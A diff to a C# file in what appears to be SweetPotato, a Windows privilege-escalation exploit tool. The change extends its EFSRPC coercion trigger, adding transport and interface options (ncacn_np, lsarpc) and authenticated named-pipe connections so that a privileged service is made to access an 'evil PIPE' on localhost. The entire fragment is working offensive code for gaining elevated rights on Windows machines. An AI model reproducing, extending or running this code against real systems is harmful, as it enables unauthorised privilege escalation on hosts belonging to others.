@@ -1,16 +1,33 @@
-﻿using NtApiDotNet.Ndr.Marshal;
-using NtApiDotNet.Win32;
-using rpc_df1941c5_fe89_4e79_bf10_463657acf44d_1_0;
+﻿using rpc_df1941c5_fe89_4e79_bf10_463657acf44d_1_0;
 using System;
 using System.Collections.Generic;
 using System.IO.Pipes;
-using System.Linq;
-using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
+using NtApiDotNet.Win32.Rpc.Transport;
 
 namespace SweetPotato {
+
+    public enum RpcTransport
+    {
+        ncalrpc,
+        ncacn_np,
+    }
+
+    public enum RpcInterface
+    {
+        efsrpc,
+        lsarpc,
+    }
     internal class EfsRpc {
+
+        //
+        // https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/403c7ae0-1a3a-4e96-8efc-54e79a2cc451
+        //
+        public static readonly Dictionary<RpcInterface, string> RpcInterfaceUuidMap = new Dictionary<RpcInterface, string>() {
+            { RpcInterface.efsrpc, "df1941c5-fe89-4e79-bf10-463657acf44d"}, 
+            { RpcInterface.lsarpc, "c681d488-d850-11d0-8c52-00c04fd90f7e" } 
+        };
+
 
         string pipeName = Guid.NewGuid().ToString();
 
@@ -56,12 +73,24 @@ namespace SweetPotato {
             efsrpcPipeThread.Start();
         }
 
-        public void TriggerEfsRpc() {
+        public void TriggerEfsRpc(RpcTransport rpcTransport, RpcInterface rpcInterface) {
 
             string targetPipe = string.Format($"\\\\localhost/pipe/{pipeName}/\\{pipeName}\\{pipeName}");
 
-            Client c = new Client();
-            c.Connect();
+            Client c = new Client(RpcInterfaceUuidMap[rpcInterface]);
+
+            if (rpcTransport == RpcTransport.ncacn_np)
+            {
+                RpcTransportSecurity trsec = new RpcTransportSecurity();
+                trsec.AuthenticationLevel = RpcAuthenticationLevel.PacketPrivacy;
+                trsec.AuthenticationType = RpcAuthenticationType.Negotiate;
+
+                c.Connect("ncacn_np", $"\\pipe\\{rpcInterface}", "localhost", trsec);
+            }
+            else
+            {
+                c.Connect();
+            }
 
             Console.WriteLine($"[+] Triggering name pipe access on evil PIPE {targetPipe}");
 
